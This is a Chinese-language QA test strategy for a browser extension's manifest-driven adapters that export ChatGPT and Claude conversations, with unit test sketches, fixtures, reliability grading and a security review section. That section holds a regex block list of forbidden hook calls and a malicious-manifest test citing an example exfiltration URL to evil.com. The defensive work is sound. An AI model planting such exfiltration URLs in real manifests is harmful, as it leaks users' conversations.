# 声明式 Adapter 架构测试策略

> QA Agent: James Bach | Date: 2026-02-07
> Method: Risk-Based Testing Strategy + Context-Driven Test Design
> 前置文档: ADR 声明式 Adapter 架构、Adapter DX 评估、MVP Quality Report

---

## 0. 测试哲学声明

**Testing 不等于 Checking。**

自动化测试（Checking）验证已知的预期行为——"输入 A 应该得到输出 B"。但真正的 Testing 是探索未知：当 ChatGPT 突然改了 API 响应结构、当某个新平台的消息树有三层嵌套、当 DOM 选择器因为一个 class 名变化全部失效——这些场景无法被预先编写的 test case 覆盖。

本策略的核心思路：
1. **自动化做 Checking**：核心工具函数、Manifest Schema 验证、消息解析管线——这些有确定输入输出的逻辑必须自动化
2. **手动做 Testing**：DOM 注入在真实页面的表现、新平台的 API 逆向、CSS 选择器脆弱性——这些需要人类的批判性思维
3. **风险驱动优先级**：把 80% 的测试精力花在 20% 最高风险的区域

---

## 1. 风险分析

### 1.1 风险矩阵

| 风险 | 概率 | 影响 | 优先级 | 测试策略 |
|------|------|------|--------|---------|
| ManifestAdapter 解析结果与旧 adapter 不一致 | 高 | Blocker | **P0** | 对比测试（Phase 3 金标准） |
| `getByPath` / `resolveTemplate` 边界条件出错 | 中 | Critical | **P0** | 单元测试（纯函数，完全可自动化） |
| Manifest Schema 验证不完整，接受了无效配置 | 中 | Major | **P0** | Schema 验证单元测试 |
| 脚本层钩子突破安全边界 | 低 | Critical | **P1** | 安全单元测试 + 手动审查清单 |
| ManifestInjector DOM 注入在真实页面失败 | 高 | Major | **P1** | 手动烟测 + DOM snapshot 检测 |
| ChatGPT/Claude 改版导致 CSS 选择器失效 | 高 | Major | **P1** | 定期手动巡检 + 选择器健康检查 |
| Token 认证缓存/重试逻辑在 ManifestAdapter 中出错 | 低 | Major | **P1** | Mock 集成测试 |
| 第三方恶意 Manifest 注入攻击向量 | 低 | Critical | **P2** | 安全审查清单 + 静态分析 |
| 新平台 API 响应结构超出声明层能力 | 中 | Low | **P2** | 脚本层钩子 escape hatch 验证 |

### 1.2 迁移阶段风险评估

每个迁移阶段的最大风险点：

| 阶段 | 最大风险 | 验收标准 |
|------|---------|---------|
| Phase 1: 添加 manifest 基础设施 | 引入新代码破坏现有功能 | `pnpm build` + `pnpm typecheck` + 现有 19 个测试全通过 |
| Phase 2: 创建 manifest 定义 | Manifest 配置有误，不能正确匹配/解析 | 新的单元测试覆盖 manifest schema 验证 |
| Phase 3: 验证输出一致性 | ManifestAdapter 的输出与旧 adapter 不完全一致 | 对比测试：同一 API 响应 fixture，两个 adapter 的输出 diff 为零 |
| Phase 4: 切换到 manifest adapter | 注册顺序或优先级导致错误的 adapter 被选中 | Registry 单元测试 + 端到端手动烟测 |
| Phase 5: 清理旧代码 | 遗漏引用导致运行时错误 | TypeScript 编译通过 + 全量测试通过 + 手动烟测 |

---

## 2. 重构安全网

### 2.1 现有功能回归测试

**当前测试基线**：19 个测试（全部在 core-markdown 包中）。core-adapters 和 browser-extension 零测试。

**安全网策略**：在重构开始前，先建立回归测试基线。

#### 步骤 1：在 Phase 1 之前冻结 API 响应 Fixtures

从 ChatGPT 和 Claude 各抓取 3-5 个真实 API 响应（脱敏后），保存为 JSON fixtures：

```
packages/core-adapters/src/__fixtures__/
├── chatgpt/
│   ├── simple-conversation.json       # 2 轮简单对话
│   ├── multi-turn.json                # 10+ 轮对话
│   ├── with-code-blocks.json          # 含代码块
│   ├── with-system-messages.json      # 含系统消息和隐藏消息
│   └── branched-conversation.json     # 含分支的树状结构
└── claude/
    ├── simple-conversation.json
    ├── multi-turn.json
    ├── with-artifacts.json            # 含 artifact 标签
    └── with-merged-messages.json      # 含连续同角色消息
```

#### 步骤 2：为旧 adapter 建立"金标准"输出

```typescript
// packages/core-adapters/src/__tests__/golden-output.test.ts
//
// 运行旧 adapter 对 fixtures 进行解析，保存输出为 golden files。
// Phase 3 时新 ManifestAdapter 必须产出完全一致的输出。

import { describe, it, expect } from "vitest";
import { ChatGPTExtAdapter } from "../adapters/chatgpt/ext-adapter";
import { ClaudeExtAdapter } from "../adapters/claude/ext-adapter";
import simpleChat from "../__fixtures__/chatgpt/simple-conversation.json";
// ... 更多 fixtures

describe("Golden Output: ChatGPT", () => {
  const adapter = new ChatGPTExtAdapter();

  it("simple conversation should match golden output", async () => {
    // 使用 mock ExtInput（mocked document, real fixture data）
    const result = await adapter.getRawMessages(mockExtInput(simpleChat));
    expect(result).toMatchSnapshot(); // vitest snapshot 作为 golden standard
  });
});
```

#### 步骤 3：Phase 3 对比测试

```typescript
// packages/core-adapters/src/__tests__/adapter-parity.test.ts
//
// 核心安全网：确保 ManifestAdapter 的输出与旧 adapter 完全一致。

describe("Parity: ManifestAdapter vs Legacy Adapter", () => {
  for (const fixture of chatgptFixtures) {
    it(`ChatGPT: ${fixture.name} should produce identical output`, async () => {
      const legacyResult = await legacyAdapter.getRawMessages(mockInput(fixture));
      const manifestResult = await manifestAdapter.parse(mockInput(fixture));

      // 比较消息内容（忽略 id, timestamp 等动态字段）
      expect(normalizeOutput(manifestResult)).toEqual(
        normalizeOutput(legacyResult)
      );
    });
  }

  // Claude 同理
});
```

### 2.2 每个阶段的验收 Checklist

#### Phase 1 验收：
- [ ] `pnpm build` 通过（包含新增的 manifest/ 目录）
- [ ] `pnpm typecheck` 通过
- [ ] 现有 19 个测试全部通过
- [ ] 新增 `getByPath` 和 `resolveTemplate` 单元测试通过
- [ ] 新增 `AdapterManifestSchema` 验证测试通过
- [ ] 现有 ChatGPT/Claude 复制功能手动烟测正常

#### Phase 2 验收：
- [ ] chatgptManifest 和 claudeManifest 通过 Schema 验证
- [ ] ManifestAdapter 可以实例化，不抛出异常
- [ ] `canHandle()` 对正确 URL 返回 true，对错误 URL 返回 false
- [ ] 现有功能不受影响（旧 adapter 仍在使用）

#### Phase 3 验收：
- [ ] **所有 fixture 对比测试通过**（ManifestAdapter 输出 === 旧 adapter 输出）
- [ ] ChatGPT 真实页面手动测试：对比 ManifestAdapter 和旧 adapter 的复制结果
- [ ] Claude 真实页面手动测试：同上
- [ ] Token 认证流程正常（ChatGPT bearer token 获取和缓存）
- [ ] Cookie 认证流程正常（Claude orgId 提取）

#### Phase 4 验收：
- [ ] Registry 中 ManifestAdapter 优先于旧 adapter
- [ ] ManifestInjector 在 ChatGPT 上正确注入 copy button
- [ ] ManifestInjector 在 Claude 上正确注入 copy button
- [ ] 侧边栏 list icons 和 batch checkboxes 正常
- [ ] Context menu 正常
- [ ] 全量手动烟测（见第 8 节烟测清单）

#### Phase 5 验收：
- [ ] TypeScript 编译通过（无旧代码引用残留）
- [ ] 全量测试通过
- [ ] Bundle size 无异常增长（允许 < 5% 波动）
- [ ] 全量手动烟测通过

---

## 3. Manifest 验证策略

### 3.1 静态验证：Zod Schema 合规性

**必须自动化**。这是 Checking 的典型场景——规则明确、输入输出确定。

```typescript
// packages/core-adapters/src/manifest/__tests__/schema.test.ts

describe("AdapterManifestSchema", () => {
  // ─── 必填字段 ───
  describe("required fields", () => {
    it("should reject manifest without id", () => {
      const { id, ...noId } = validManifest;
      expect(() => AdapterManifestSchema.parse(noId)).toThrow();
    });

    it("should reject manifest without urls", () => { /* ... */ });
    it("should reject manifest without auth", () => { /* ... */ });
    it("should reject manifest without endpoint", () => { /* ... */ });
    it("should reject manifest without parsing", () => { /* ... */ });
    it("should reject manifest without injection", () => { /* ... */ });
    it("should reject manifest without theme", () => { /* ... */ });
  });

  // ─── URL Pattern 格式 ───
  describe("url patterns", () => {
    it("should accept valid hostPermissions glob patterns", () => {
      // "https://chatgpt.com/*" -> 合法
    });

    it("should accept RegExp for hostPatterns", () => {
      // /^https:\/\/chatgpt\.com\//i -> 合法
    });

    it("should accept RegExp with capture group for conversationUrlPatterns", () => {
      // /\/c\/([a-zA-Z0-9-]+)/ -> 合法（有捕获组）
    });
  });

  // ─── 认证配置 ───
  describe("auth config", () => {
    it("should accept cookie-session without extra fields", () => { /* ... */ });
    it("should accept bearer-from-api with sessionEndpoint", () => { /* ... */ });
    it("should accept none auth method", () => { /* ... */ });
    it("should reject bearer-from-api without sessionEndpoint", () => {
      // 这是一个业务规则验证——如果 method 是 bearer-from-api，
      // sessionEndpoint 应该是必填的。
      // 注意：当前 Schema 中 sessionEndpoint 是 optional，
      // 需要确认是否需要 refine 来加强验证。
    });
  });

  // ─── Endpoint 配置 ───
  describe("endpoint config", () => {
    it("should accept urlTemplate with {conversationId} placeholder", () => { /* ... */ });
    it("should accept GET and POST methods", () => { /* ... */ });
    it("should use default values for credentials and cache", () => { /* ... */ });
  });

  // ─── 消息解析配置 ───
  describe("parsing config", () => {
    it("should accept valid role mapping", () => { /* ... */ });
    it("should accept role mapping with skip value", () => { /* ... */ });
    it("should accept content extraction with all fields", () => { /* ... */ });
    it("should accept content extraction with minimal fields", () => { /* ... */ });
  });

  // ─── 完整 Manifest ───
  describe("full manifest validation", () => {
    it("should accept chatgptManifest", () => {
      expect(() => AdapterManifestSchema.parse(chatgptManifest)).not.toThrow();
    });

    it("should accept claudeManifest", () => {
      expect(() => AdapterManifestSchema.parse(claudeManifest)).not.toThrow();
    });

    it("should accept perplexityManifest (minimal, no hooks)", () => {
      expect(() => AdapterManifestSchema.parse(perplexityManifest)).not.toThrow();
    });
  });
});
```

**测试数量估算**：30-40 个测试用例。

### 3.2 运行时验证

运行时验证不适合全部自动化，因为需要真实的浏览器环境。策略：

| 验证点 | 自动化? | 方法 |
|--------|---------|------|
| URL pattern 是否正确匹配目标页面 | 是 | 单元测试：用真实 URL 样本测试 `canHandle()` |
| CSS 选择器是否存在于目标页面 | 否 | 手动巡检（见 6.2 节） |
| API 端点是否可达且返回预期格式 | 否 | 手动巡检 + 可选的 CI health check |
| 会话 ID 是否能从 URL 正确提取 | 是 | 单元测试 |

### 3.3 开发时验证（DX 相关）

建议在 Manifest 注册时（`registerManifestAdapter`）增加以下运行时 warning（非阻断）：

1. `urlTemplate` 中的 `{variable}` 是否在已知变量列表中
2. `conversationUrlPatterns` 中是否至少有一个正则包含捕获组
3. `auth.method === "bearer-from-api"` 时 `sessionEndpoint` 是否配置
4. `parsing.content.messagesPath` 路径是否看起来合理（不为空）

这些不是测试，是开发体验增强——开发者第一次写错时就能得到反馈。

---

## 4. 核心引擎测试

### 4.1 工具函数测试（`getByPath` / `resolveTemplate`）

**必须自动化，P0 优先级。**

这两个函数是整个声明式引擎的基石。它们是纯函数，输入输出确定，非常适合单元测试。

```typescript
// packages/core-adapters/src/manifest/__tests__/utils.test.ts

describe("getByPath", () => {
  // ─── 正常路径 ───
  it("should get top-level field", () => {
    expect(getByPath({ name: "hello" }, "name")).toBe("hello");
  });

  it("should get nested field", () => {
    expect(getByPath({ a: { b: { c: 42 } } }, "a.b.c")).toBe(42);
  });

  it("should get field from array element property", () => {
    // 注意：不支持数组索引，但应该能访问对象属性
    const obj = { messages: [{ role: "user" }] };
    expect(getByPath(obj, "messages")).toEqual([{ role: "user" }]);
  });

  // ─── 边界条件 ───
  it("should return undefined for non-existent path", () => {
    expect(getByPath({ a: 1 }, "b")).toBeUndefined();
  });

  it("should return undefined for deep non-existent path", () => {
    expect(getByPath({ a: { b: 1 } }, "a.c.d")).toBeUndefined();
  });

  it("should return undefined when traversing through null", () => {
    expect(getByPath({ a: null }, "a.b")).toBeUndefined();
  });

  it("should return undefined when traversing through undefined", () => {
    expect(getByPath({ a: undefined }, "a.b")).toBeUndefined();
  });

  it("should return undefined when traversing through primitive", () => {
    expect(getByPath({ a: "string" }, "a.b")).toBeUndefined();
  });

  it("should handle empty path", () => {
    // 边界：空字符串路径。当前实现会 split(".")  得到 [""]，
    // 然后尝试 obj[""]，返回 undefined。应明确预期。
    expect(getByPath({ "": "empty" }, "")).toBe("empty");
  });

  it("should handle path with single segment", () => {
    expect(getByPath({ title: "test" }, "title")).toBe("test");
  });

  it("should return the entire object for empty input", () => {
    // 如果传入 null/undefined 作为 obj
    expect(getByPath(null, "a")).toBeUndefined();
    expect(getByPath(undefined, "a")).toBeUndefined();
  });

  // ─── 真实场景（ChatGPT/Claude 响应路径） ───
  it("should extract ChatGPT title from response", () => {
    const response = { title: "My Conversation", mapping: {} };
    expect(getByPath(response, "title")).toBe("My Conversation");
  });

  it("should extract Claude messages from response", () => {
    const response = { chat_messages: [{ sender: "human", content: [] }] };
    expect(getByPath(response, "chat_messages")).toHaveLength(1);
  });

  it("should extract nested role from ChatGPT message node", () => {
    const node = { message: { author: { role: "assistant" } } };
    expect(getByPath(node, "message.author.role")).toBe("assistant");
  });
});

describe("resolveTemplate", () => {
  it("should replace single variable", () => {
    expect(
      resolveTemplate("https://api.com/chat/{id}", { id: "abc" })
    ).toBe("https://api.com/chat/abc");
  });

  it("should replace multiple variables", () => {
    expect(
      resolveTemplate("https://api.com/{org}/chat/{id}", {
        org: "myorg",
        id: "abc",
      })
    ).toBe("https://api.com/myorg/chat/abc");
  });

  it("should URL-encode variable values", () => {
    expect(
      resolveTemplate("https://api.com/chat/{id}", { id: "a/b c" })
    ).toBe("https://api.com/chat/a%2Fb%20c");
  });

  it("should leave unreferenced variables unchanged", () => {
    expect(
      resolveTemplate("https://api.com/chat/{id}", { other: "val" })
    ).toBe("https://api.com/chat/{id}");
  });

  it("should replace all occurrences of same variable", () => {
    expect(
      resolveTemplate("{id}/{id}", { id: "abc" })
    ).toBe("abc/abc");
  });

  it("should handle empty vars object", () => {
    expect(
      resolveTemplate("https://api.com/chat/{id}", {})
    ).toBe("https://api.com/chat/{id}");
  });

  it("should handle template with no variables", () => {
    expect(
      resolveTemplate("https://api.com/static", { id: "abc" })
    ).toBe("https://api.com/static");
  });

  // ─── 安全边界 ───
  it("should not execute regex injection via variable name", () => {
    // resolveTemplate 内部使用 new RegExp(`\\{${key}\\}`)
    // 如果 key 包含正则特殊字符，可能导致异常。
    // 这是一个需要关注的安全点。
    expect(() =>
      resolveTemplate("{test}", { "test": "val" })
    ).not.toThrow();
  });
});
```

**测试数量估算**：20-25 个测试用例。

### 4.2 ManifestAdapter 引擎测试

ManifestAdapter 是整个架构的心脏。测试需要 mock `fetch` 和 `document`。

```typescript
// packages/core-adapters/src/manifest/__tests__/manifest-adapter.test.ts

describe("ManifestAdapter", () => {
  // 使用一个简化的 manifest（类似 Perplexity 示例）
  const simpleManifest = createSimpleManifest();

  describe("canHandle", () => {
    it("should return true for matching URL", () => {
      const adapter = new ManifestAdapter(simpleManifest);
      expect(adapter.canHandle({
        type: "ext",
        url: "https://www.perplexity.ai/search/abc-123",
        document: {} as Document,
      })).toBe(true);
    });

    it("should return false for non-matching URL", () => {
      const adapter = new ManifestAdapter(simpleManifest);
      expect(adapter.canHandle({
        type: "ext",
        url: "https://other-site.com/page",
        document: {} as Document,
      })).toBe(false);
    });

    it("should return false for non-ext input type", () => {
      const adapter = new ManifestAdapter(simpleManifest);
      expect(adapter.canHandle({
        type: "ext",
        url: "https://other.com",
        document: {} as Document,
      })).toBe(false);
    });
  });

  describe("parse - conversation ID extraction", () => {
    it("should extract ID from URL using conversationUrlPatterns", () => { /* ... */ });
    it("should use extractConversationId hook when provided", () => { /* ... */ });
    it("should throw E-PARSE-001 when ID cannot be extracted", () => { /* ... */ });
  });

  describe("parse - authentication", () => {
    it("should call extractAuth hook when provided", () => { /* ... */ });
    it("should pass auth vars to URL template", () => { /* ... */ });
    it("should handle bearer-from-api token flow", () => { /* ... */ });
    it("should retry on 401 with fresh token", () => { /* ... */ });
    it("should throw on non-401 error status", () => { /* ... */ });
  });

  describe("parse - response parsing", () => {
    it("should extract messages using messagesPath", () => { /* ... */ });
    it("should map roles using role.mapping", () => { /* ... */ });
    it("should skip messages with role mapped to 'skip'", () => { /* ... */ });
    it("should extract text using textPath", () => { /* ... */ });
    it("should extract title using titlePath", () => { /* ... */ });
    it("should sort messages by sortField", () => { /* ... */ });
    it("should skip empty text messages", () => { /* ... */ });
  });

  describe("parse - hooks integration", () => {
    it("should use transformResponse hook before parsing", () => { /* ... */ });
    it("should use extractMessageText hook instead of textPath", () => { /* ... */ });
    it("should use afterParse hook for post-processing", () => { /* ... */ });
    it("should prefer hook title over titlePath", () => { /* ... */ });
  });

  describe("parse - filters", () => {
    it("should skip messages matching equals filter", () => { /* ... */ });
    it("should skip messages matching exists filter", () => { /* ... */ });
    it("should skip messages matching matchesPattern filter", () => { /* ... */ });
    it("should not skip messages that don't match any filter", () => { /* ... */ });
  });

  describe("parse - error handling", () => {
    it("should throw E-PARSE-005 when no messages found", () => { /* ... */ });
    it("should throw E-PARSE-005 on API error", () => { /* ... */ });
    it("should return empty messages when messagesPath resolves to non-array", () => { /* ... */ });
  });
});
```

**测试数量估算**：30-40 个测试用例。

### 4.3 ManifestInjector 引擎测试

ManifestInjector 操作 DOM，需要 jsdom 或 happy-dom 环境。但 MutationObserver 和 `getComputedStyle` 在 jsdom 中支持有限。

**策略**：

| 功能 | 自动化? | 方法 |
|------|---------|------|
| `tryInjectCopyButton` — 找到选择器并注入 | 部分 | jsdom 中测试基本 DOM 查找和插入逻辑 |
| `tryInjectListIcons` — 遍历列表项并注入 | 部分 | jsdom 中测试 |
| `cleanup` — 移除所有注入元素和 observer | 是 | jsdom 中测试 |
| MutationObserver 触发重新注入 | 否 | 手动在真实页面测试 |
| hover 显示/隐藏 list icons | 否 | 手动在真实页面测试 |
| 多选择器 fallback（第一个不匹配时尝试第二个） | 是 | jsdom 中测试 |

```typescript
// apps/browser-extension/src/injectors/__tests__/manifest-injector.test.ts

describe("ManifestInjector", () => {
  describe("injectCopyButton", () => {
    it("should find element by first matching selector", () => { /* ... */ });
    it("should fallback to second selector if first not found", () => { /* ... */ });
    it("should not inject duplicate buttons", () => { /* ... */ });
    it("should respect position config (prepend/append/before/after)", () => { /* ... */ });
  });

  describe("injectListIcons", () => {
    it("should inject icon for each list item with valid href", () => { /* ... */ });
    it("should extract conversation ID from href using idPattern", () => { /* ... */ });
    it("should skip items without href", () => { /* ... */ });
    it("should skip already-injected items", () => { /* ... */ });
  });

  describe("cleanup", () => {
    it("should remove all injected elements", () => { /* ... */ });
    it("should disconnect all observers", () => { /* ... */ });
    it("should clear all timers", () => { /* ... */ });
  });
});
```

**测试数量估算**：15-20 个测试用例。

### 4.4 Registry 测试

```typescript
// packages/core-adapters/src/manifest/__tests__/registry.test.ts

describe("Manifest Registry", () => {
  it("should register manifest adapter and make it findable", () => { /* ... */ });
  it("should reject duplicate adapter IDs", () => { /* ... */ });
  it("should create working ManifestAdapter from manifest + hooks", () => { /* ... */ });
  it("should work with parseWithAdapters", () => { /* ... */ });
});
```

---

## 5. Adapter 可靠性评估

### 5.1 可靠性等级定义

| 等级 | 含义 | 判定标准 |
|------|------|---------|
| **A** (High) | 稳定可靠 | 使用官方/稳定 API；选择器有 3+ fallback；有完整的对比测试 |
| **B** (Medium) | 基本可靠 | 使用非公开但稳定的 API；选择器有 1-2 fallback；有基本单元测试 |
| **C** (Low) | 可能不稳定 | 依赖 DOM scraping 或逆向 API；选择器无 fallback；无自动化测试 |

### 5.2 自动评估指标

以下指标可以自动计算，作为可靠性评估的输入（不是最终判定）：

```typescript
interface ReliabilityMetrics {
  // 选择器健壮性
  copyButtonSelectorCount: number;     // injection.copyButton.selectors.length
  hasMultipleSelectorFallbacks: boolean; // >= 2 个选择器

  // API 配置完整性
  hasAuthConfig: boolean;
  hasFilterRules: boolean;
  hasMetadata: boolean;

  // 钩子依赖度
  hookCount: number;                    // 使用了多少个钩子
  usesTransformResponse: boolean;       // 需要预处理 = 响应结构复杂

  // 测试覆盖
  hasGoldenOutputTest: boolean;
  hasSchemaValidationTest: boolean;
}

function assessReliability(metrics: ReliabilityMetrics): "A" | "B" | "C" {
  if (
    metrics.copyButtonSelectorCount >= 3 &&
    metrics.hasGoldenOutputTest &&
    metrics.hasMetadata
  ) return "A";

  if (
    metrics.copyButtonSelectorCount >= 2 &&
    metrics.hasSchemaValidationTest
  ) return "B";

  return "C";
}
```

### 5.3 DOM 选择器脆弱性检测

CSS 选择器是整个架构中最脆弱的环节（MVP Quality Report 已标记为 HIGH RISK）。

**检测策略**：

1. **选择器复杂度评分**（可自动化）：

```
低风险：   #unique-id                      → ID 选择器，最稳定
低风险：   [data-testid="xxx"]             → data 属性，平台有意提供
中风险：   nav a[href^="/c/"]              → 语义化标签 + 属性
高风险：   .flex.items-center.gap-2         → 多个 utility class 组合
极高风险： main .sticky .flex > div:nth-child(2) → 深层嵌套 + 位置依赖
```

2. **选择器健康检查脚本**（手动运行）：

```typescript
// scripts/check-selectors.ts
// 在目标网站的 DevTools console 中运行

function checkSelectors(manifest: AdapterManifest) {
  const results: Record<string, boolean> = {};

  // 检查 copy button 选择器
  for (const sel of manifest.injection.copyButton.selectors) {
    results[`copyButton: ${sel}`] = !!document.querySelector(sel);
  }

  // 检查 list item 选择器
  results[`listItem: ${manifest.injection.listItem.linkSelector}`] =
    document.querySelectorAll(manifest.injection.listItem.linkSelector).length > 0;

  // 检查 sidebar 选择器
  if (manifest.injection.sidebarSelector) {
    results[`sidebar: ${manifest.injection.sidebarSelector}`] =
      !!document.querySelector(manifest.injection.sidebarSelector);
  }

  console.table(results);
  return results;
}
```

3. **定期巡检计划**：

| 频率 | 检查内容 | 责任人 |
|------|---------|--------|
| 每周 | 在 ChatGPT 和 Claude 上手动运行选择器健康检查 | 创始人（dogfooding） |
| 每次平台 UI 更新后 | 全量选择器检查 + 手动烟测 | 创始人 |
| 每个新平台 adapter 提交时 | 选择器复杂度评审 | Code Review |

### 5.4 API 响应结构变化感知

**问题**：ChatGPT 和 Claude 的 API 是非公开的，可能随时变更响应结构。

**策略**：

1. **Schema 快照测试**：保存 API 响应的 JSON Schema（用 zod-to-json-schema 或手动），定期与真实响应比对。

2. **关键字段存在性检查**：在 `ManifestAdapter.parseResponse` 中增加 warning（不是 error）：

```typescript
// 如果 messagesPath 解析到的不是数组，log warning
if (!Array.isArray(rawMessageList)) {
  console.warn(
    `[CtxPort] ${this.name}: messagesPath "${parsing.content.messagesPath}" ` +
    `resolved to ${typeof rawMessageList}, expected array. ` +
    `API response structure may have changed.`
  );
}
```

3. **用户反馈回路**：当复制失败时，在 toast 中提示"如果此问题持续出现，请到 GitHub 报告"，附带自动收集的错误上下文（不包含对话内容，只包含错误码和 adapter 版本）。

---

## 6. 安全测试

### 6.1 脚本层钩子安全边界验证

ADR 明确规定钩子不能访问 `fetch`、不能修改 DOM、不能访问 extension API。验证方式：

**Code Review 清单**（每个新 adapter 的钩子必须通过）：

- [ ] 钩子函数不包含 `fetch(` 或 `XMLHttpRequest` 调用
- [ ] 钩子函数不包含 `document.createElement`、`innerHTML`、`appendChild` 等 DOM 修改操作
- [ ] 钩子函数不包含 `chrome.runtime`、`chrome.storage`、`browser.runtime` 等 extension API 调用
- [ ] 钩子函数不包含 `eval(`、`Function(`、`setTimeout(string)` 等动态代码执行
- [ ] 钩子函数不包含 `window.open`、`location.href =` 等导航操作
- [ ] 钩子函数只使用 `HookContext` 中声明的属性

**自动化静态分析**（可选，P2）：

```typescript
// scripts/lint-hooks.ts
// 对钩子函数的源代码做简单的正则检查

const FORBIDDEN_PATTERNS = [
  /\bfetch\s*\(/,
  /\bXMLHttpRequest\b/,
  /\bdocument\.(createElement|write|append|insert|remove)/,
  /\bchrome\.(runtime|storage|tabs)/,
  /\bbrowser\.(runtime|storage|tabs)/,
  /\beval\s*\(/,
  /\bnew\s+Function\s*\(/,
  /\bwindow\.open\s*\(/,
  /\blocation\.(href|assign|replace)\s*=/,
];
```

**注意**：静态分析不能捕获所有绕过手段（如通过变量间接引用）。对于社区提交的 adapter，Code Review 是最终防线。

### 6.2 恶意 Manifest 防护测试

```typescript
describe("Malicious Manifest Defense", () => {
  it("should reject manifest with URL template pointing to non-declared domain", () => {
    // urlTemplate: "https://evil.com/steal?data={conversationId}"
    // 而 hostPermissions 只有 "https://chatgpt.com/*"
    // Schema 不会阻止这个，但应该有运行时警告或验证
  });

  it("should reject manifest with excessively long regex patterns", () => {
    // ReDoS 防护：正则表达式不应该有灾难性回溯的可能
  });

  it("should not execute code in manifest string fields", () => {
    // 确保 urlTemplate、headerss 等字段作为纯字符串处理
    // 不会被 eval 或 template literal 执行
  });
});
```

### 6.3 第三方 Adapter 安全审查清单

适用于社区提交的 adapter（信任层级 "社区认证" 和 "社区提交"）：

**自动检查**（CI 中执行）：
- [ ] Manifest 通过 Zod Schema 验证
- [ ] `urlTemplate` 中的域名在 `hostPermissions` 范围内
- [ ] `sessionEndpoint` 在 `hostPermissions` 范围内
- [ ] 无脚本层钩子（纯声明式）→ 自动标记为"安全"
- [ ] 有脚本层钩子 → 标记需要人工审查

**人工检查**（Code Review）：
- [ ] 钩子函数逻辑合理，没有可疑的数据外泄行为
- [ ] 钩子函数没有网络请求、DOM 修改、extension API 调用
- [ ] URL patterns 合理（不会匹配到非目标网站）
- [ ] 请求头中没有包含敏感信息泄露的字段
- [ ] 认证方式合理（cookie-session 或 bearer-from-api）

---

## 7. 测试自动化策略

### 7.1 测试金字塔

```
                    ╱╲
                   ╱  ╲
                  ╱ E2E╲           2-3 个手动烟测场景
                 ╱ (手动) ╲         （不自动化，成本太高）
                ╱──────────╲
               ╱  集成测试   ╲      15-20 个测试
              ╱  (Vitest +    ╲     （ManifestAdapter + mocked fetch）
             ╱   mocked env)   ╲
            ╱────────────────────╲
           ╱      单元测试        ╲   60-80 个测试
          ╱  (Vitest, 纯函数)      ╲  （utils, schema, registry, hooks）
         ╱──────────────────────────╲
```

### 7.2 必须自动化

| 类别 | 原因 | 预估测试数 |
|------|------|-----------|
| `getByPath` / `resolveTemplate` | 纯函数，边界条件多，回归风险高 | 20-25 |
| `AdapterManifestSchema` 验证 | 规则明确，新 manifest 提交时自动验证 | 30-40 |
| ManifestAdapter.parse（mocked fetch） | 核心解析管线，必须保证正确性 | 30-40 |
| ChatGPT/Claude 对比测试（Phase 3） | 迁移安全网，确保输出一致 | 10-15 |
| Registry 注册和匹配 | 简单但关键 | 5-10 |
| ManifestInjector 基本 DOM 操作（jsdom） | 注入逻辑的基本正确性 | 15-20 |

**总计**：约 110-150 个自动化测试。

### 7.3 不应自动化

| 类别 | 原因 |
|------|------|
| 真实网页上的 DOM 注入 | MutationObserver、CSS 渲染、hover 事件在 jsdom 中不可靠 |
| 真实 API 端到端调用 | 需要登录态，响应内容不可控 |
| CSS 选择器在真实页面的匹配 | 页面结构随时变化，自动化测试会频繁误报 |
| 不同浏览器的兼容性 | Chrome 扩展只在 Chrome 上运行，Playwright 不支持扩展测试 |
| 视觉回归（注入按钮的样式） | 宿主页面 CSS 环境不可控 |

### 7.4 需要手动探索性测试

| 场景 | 探索方向 | 启发式 |
|------|---------|--------|
| ChatGPT 长对话（100+ 消息） | 性能、完整性、排序 | SFDPOT-Data |
| Claude artifact 对话 | artifact 标签是否正确转换 | SFDPOT-Function |
| ChatGPT GPT-4o + Canvas 对话 | 新模型/功能是否被正确解析 | SFDPOT-Function |
| 快速连续点击复制按钮 | 并发请求、token 竞态 | SFDPOT-Time |
| 网络不稳定时复制 | 超时处理、错误提示 | SFDPOT-Operations |
| 批量模式选择 20+ 对话 | 内存、性能、UI 响应 | SFDPOT-Data, Time |
| 从一个对话页面导航到另一个 | SPA 路由变化检测、注入清理/重新注入 | SFDPOT-Operations |

---

## 8. 测试工具和环境

### 8.1 推荐工具链

| 工具 | 用途 | 理由 |
|------|------|------|
| **Vitest** | 单元测试 + 集成测试 | 已在 core-markdown 中使用；与 Vite/WXT 生态一致；比 Jest 快 |
| **jsdom (via Vitest)** | DOM 环境模拟 | 用于 ManifestInjector 的基本 DOM 测试 |
| **happy-dom (备选)** | DOM 环境模拟 | 如果 jsdom 性能不够，可切换 |
| **vitest-fetch-mock** | fetch mock | 用于 ManifestAdapter 的 API 请求 mock |
| **Vitest Snapshot** | 金标准对比测试 | 用于 Phase 3 输出一致性验证 |

**不推荐 Playwright/Puppeteer E2E**：

原因：
1. Chrome 扩展的 content script 无法在 Playwright 中方便地测试
2. 需要 ChatGPT/Claude 的登录态，CI 中无法获取
3. 真实 API 返回内容不可控，测试不确定性高
4. 投入产出比极低：一人公司的时间更应花在手动探索性测试上

### 8.2 Mock 策略

#### Mock fetch

```typescript
// packages/core-adapters/src/__tests__/helpers/mock-fetch.ts

import { vi } from "vitest";

export function mockFetch(responses: Map<string, unknown>) {
  return vi.fn(async (url: string) => {
    const body = responses.get(url);
    if (!body) {
      return { ok: false, status: 404, json: async () => ({}) };
    }
    return {
      ok: true,
      status: 200,
      json: async () => body,
    };
  });
}
```

#### Mock Document (for Claude orgId extraction)

```typescript
export function mockDocument(cookie: string = ""): Document {
  return {
    cookie,
    querySelector: vi.fn(() => null),
    querySelectorAll: vi.fn(() => []),
  } as unknown as Document;
}
```

#### Mock ExtInput

```typescript
export function mockExtInput(
  url: string,
  cookie: string = "",
): ExtInput {
  return {
    type: "ext" as const,
    url,
    document: mockDocument(cookie),
  };
}
```

### 8.3 Fixture 管理

```
packages/core-adapters/src/
├── __fixtures__/
│   ├── chatgpt/
│   │   ├── simple-conversation.json     # 脱敏的真实 API 响应
│   │   ├── multi-turn.json
│   │   ├── with-code-blocks.json
│   │   └── README.md                   # 说明如何抓取和脱敏 fixture
│   └── claude/
│       ├── simple-conversation.json
│       ├── multi-turn.json
│       └── with-artifacts.json
└── __tests__/
    ├── helpers/
    │   ├── mock-fetch.ts
    │   ├── mock-document.ts
    │   └── fixtures.ts                  # fixture 加载工具
    ├── utils.test.ts
    ├── schema.test.ts
    ├── manifest-adapter.test.ts
    ├── golden-output.test.ts
    └── adapter-parity.test.ts
```

### 8.4 CI/CD 集成建议

```yaml
# .github/workflows/test.yml (概念)

test:
  steps:
    - pnpm install
    - pnpm build                    # 确保构建通过
